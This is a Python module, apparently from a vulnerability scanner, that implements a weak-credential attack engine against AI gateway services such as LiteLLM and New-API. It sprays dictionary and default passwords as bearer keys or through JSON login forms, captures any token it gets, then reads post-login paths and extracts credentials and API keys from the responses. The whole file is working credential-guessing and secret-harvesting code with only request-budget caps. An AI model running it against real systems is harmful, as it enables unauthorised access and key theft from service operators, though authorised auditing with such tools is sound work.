"""L1 weak-password login → authenticated config/key reads.

Uses the configured password dictionary (see ``prober/credentials_dict.py``).
Attempt count is limited by target request budget and optional
``WEAK_PASSWORD_MAX_ATTEMPTS`` (0 = full dict, still budget-capped).
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from ..credentials_dict import get_weak_credentials
from .common import EngineResult, make_finding

if TYPE_CHECKING:
    from ..base import Prober
    from ..capability.spec import ProbeSpec
    from ..capability.types import ProbeContext


def _post_reserve(spec: ProbeSpec) -> int:
    """HTTP requests to keep in reserve for post-auth reads after login."""
    return max(1, min(5, len(spec.entry.get("post_auth_paths") or ()) or 1))


def _spec_login_cap(spec: ProbeSpec) -> int:
    """Login attempts the Spec's own ``max_requests`` audit budget permits.

    The Spec budget covers the whole node (login attempts + post-auth reads),
    so reserve room for the reads. Always allow at least one login attempt.
    """
    return max(1, int(spec.max_requests) - _post_reserve(spec))


def _login_attempt_cap(prober: Prober, spec: ProbeSpec) -> int:
    """Max login *attempts* (not raw HTTP budget).

    Priority:
    1. ``WEAK_PASSWORD_MAX_ATTEMPTS`` when > 0
    2. With a target RequestBudget: effectively unlimited — budget checks stop us
    3. No budget (unit tests): small soft cap so full dict is not sprayed

    In every case the per-Spec ``max_requests`` is a hard upper bound so a
    product Spec that declares e.g. ``max_requests=12`` cannot balloon into
    hundreds of login requests off the shared target budget.
    """
    from aipocket.core.config import settings

    configured = int(getattr(settings, "weak_password_max_attempts", 0) or 0)
    if configured > 0:
        cap = configured
    elif prober.budget_remaining is not None:
        # Production runner always attaches a budget; let remaining be the stop.
        cap = 1_000_000
    else:
        # No RequestBudget: do not spray the full dict unbounded in unit tests.
        cap = min(max(int(spec.max_requests), 8), 32)

    return min(cap, _spec_login_cap(spec))


def _attempt_budget(prober: Prober, spec: ProbeSpec, attempted: int) -> bool:
    """Return True if another login attempt is allowed.

    Two independent caps must BOTH hold:
    - the shared target :class:`RequestBudget` (second-layer, cross-Spec), and
    - this Spec's own ``max_requests`` audit budget (first-layer, per-node).
    """
    remaining = prober.budget_remaining
    if remaining is not None and remaining <= 0:
        return False
    if remaining is not None and remaining <= _post_reserve(spec):
        return False
    return attempted < _login_attempt_cap(prober, spec)


async def run_weak_password(
    prober: Prober,
    ctx: ProbeContext,
    spec: ProbeSpec,
) -> EngineResult:
    entry = spec.entry
    origin = prober._url(ctx.hit)
    result = EngineResult()
    before = prober.budget_consumed
    style = entry.get("auth_style", "login_json")
    dictionary = list(get_weak_credentials())
    extra_creds: list[tuple[str, str]] = list(entry.get("extra_credentials") or ())
    if extra_creds:
        # Product-specific defaults first, then global dict (dedupe)
        merged: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()
        for pair in list(extra_creds) + dictionary:
            if pair in seen:
                continue
            seen.add(pair)
            merged.append(pair)
        dictionary = merged

    attempts = 0

    # 1) Optional master-key bearer style (LiteLLM)
    if style in ("bearer_master_key", "hybrid"):
        paths = list(entry.get("bearer_paths") or entry.get("post_auth_paths") or ())
        for _, password in dictionary:
            if not _attempt_budget(prober, spec, attempts):
                break
            hit_any = False
            for path in paths:
                resp = await prober._get(
                    prober._url(ctx.hit, path),
                    headers={"Authorization": f"Bearer {password}"},
                )
                attempts += 1
                result.requests_used = prober.budget_consumed - before
                found = prober._extract_from_response(
                    resp,
                    ctx.hit,
                    f"{spec.product}_weak_{path.strip('/').replace('/', '_')}",
                )
                if found:
                    result.credentials.extend(found)
                    ctx.session = password
                    ctx.auth_headers = {"Authorization": f"Bearer {password}"}
                    hit_any = True
                    break
            if hit_any:
                break

    # 2) Form/JSON login
    if style in ("login_json", "hybrid") and not ctx.session:
        login_path = entry.get("login") or entry.get("login_path") or ""
        login_url = prober._url(ctx.hit, login_path)
        if not login_url:
            result.reason = "no login path"
            return result

        body_template: dict[str, Any] = dict(
            entry.get("body") or {"username": "{user}", "password": "{pass}"}
        )
        token_fields: list[str] = list(
            entry.get("token_fields") or ["token", "access_token", "key", "api_key"]
        )
        success_field = entry.get("success_field")  # e.g. "success" for New-API
        password_prefix = entry.get("password_prefix", "")  # LiteLLM: "litellm_"

        token = ""
        for username, password in dictionary:
            if not _attempt_budget(prober, spec, attempts):
                break
            pwd = f"{password_prefix}{password}" if password_prefix else password
            body: dict[str, Any] = {}
            for k, v in body_template.items():
                if isinstance(v, str):
                    body[k] = v.replace("{user}", username).replace("{pass}", pwd)
                else:
                    body[k] = v
            resp = await prober._post(login_url, json=body)
            attempts += 1
            result.requests_used = prober.budget_consumed - before
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except ValueError:
                continue
            if not isinstance(data, dict):
                continue
            if success_field and not data.get(success_field):
                continue
            # New-API: data is the token string when success=true
            raw_data = data.get("data")
            if isinstance(raw_data, str) and raw_data and success_field:
                token = raw_data
                break
            for field in token_fields:
                val = data.get(field)
                if isinstance(val, str) and val:
                    token = val
                    break
                if isinstance(raw_data, dict):
                    nested = raw_data.get(field)
                    if isinstance(nested, str) and nested:
                        token = nested
                        break
            if token:
                break

        if token:
            ctx.session = token
            header_name = entry.get("auth_header", "Authorization")
            header_fmt = entry.get("auth_header_format", "Bearer {token}")
            ctx.auth_headers = {header_name: header_fmt.format(token=token)}

    # 3) Post-auth reads
    if ctx.session or ctx.auth_headers:
        post_paths = list(entry.get("post_auth_paths") or ())
        headers = dict(ctx.auth_headers)
        for path in post_paths:
            remaining = prober.budget_remaining
            if remaining is not None and remaining <= 0:
                break
            resp = await prober._get(prober._url(ctx.hit, path), headers=headers)
            result.requests_used = prober.budget_consumed - before
            found = prober._extract_from_response(
                resp,
                ctx.hit,
                f"{spec.product}_authed_{path.strip('/').replace('/', '_')}",
            )
            result.credentials.extend(found)

        result.findings.append(
            make_finding(
                vuln_class=spec.vuln_class,
                product=spec.product,
                target_origin=origin,
                spec_id=spec.id,
                cve_ids=spec.cve_ids,
                confirmed=True,
                summary="Weak/default credentials accepted; post-auth reads executed",
                severity="high",
                credentials=result.credentials,
                evidence={
                    "auth_style": style,
                    "has_session": bool(ctx.session),
                    "attempts": attempts,
                    "dict_size": len(dictionary),
                },
            )
        )
    else:
        result.reason = f"no weak credential accepted after {attempts} attempts"

    return result
